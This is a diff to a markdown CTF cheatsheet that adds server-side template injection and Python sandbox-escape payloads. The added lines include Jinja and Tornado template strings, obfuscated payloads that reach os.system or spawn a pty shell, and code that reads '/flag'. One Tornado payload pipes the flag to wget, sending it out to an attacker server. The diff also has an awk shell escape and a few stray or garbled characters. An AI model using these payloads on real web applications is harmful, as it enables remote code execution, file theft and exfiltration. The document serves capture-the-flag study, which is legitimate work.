@@ -1,8 +1,27 @@
 # Bash And CTF Cheatsheet
 
 ## Server Side Template Injection
-```bash
+```
+{{()}}
+{{''}}
+{{ globals }}
+{{ dict }}
+{{ range }}
+{{ self.__dict__ }}
+{{ get_flashed_message.__globals__ }}
+
+list(list(''.__reduce__(42).__getitem__(0).__globals__.values()).__getitem__(1).
+values()).__getitem__(125)("/flag").read() # maybe tornado
+dict(b=globals).get('b')().pop('__buil''tins__').pop('op''en')('/flag').read() # maybe tornado
+globals().__getitem__('__bui''ltins__').__getitem__('op''en')('/flag').read() # maybe tornado
+## source : https://spyclub.tech/2018/inctf2018-web-challenge-writeup/
+
+bash
 {{ ().__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].system('cat flag.txt') }}
+
+# Tornado : https://ctftime.org/writeup/11519
+{{globals.__self__.exec("imp"+"ort o"+"s;o"+"s.system('cat /flag|xa"+"rgs wget http://my_server 80 --user-agent')")}}
+
 ```
 
 
@@ -68,6 +87,7 @@ awk 'BEGIN {system("/bin/bash")}'
 
 ## Python eval payload
 
+i
 ```python
 print('THIS IS A PYTHON EVAL INTERPRETED OUTPUT')
 exit()
@@ -110,6 +130,10 @@ print(__import__['os'].system('cd /; python -m SimpleHTTPServer'))
 [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)]('pty).spawn('sh')
 
 [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)]('subprocess').check_output('ls')
+
+## https://github.com/flawwan/CTF-Writeups/blob/master/inCTF2018/secure-file-uploader.md
+getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]('flag').read()
 ```
 source : [https://www.floyd.ch/?p=584](https://www.floyd.ch/?p=584) 
 
+## 
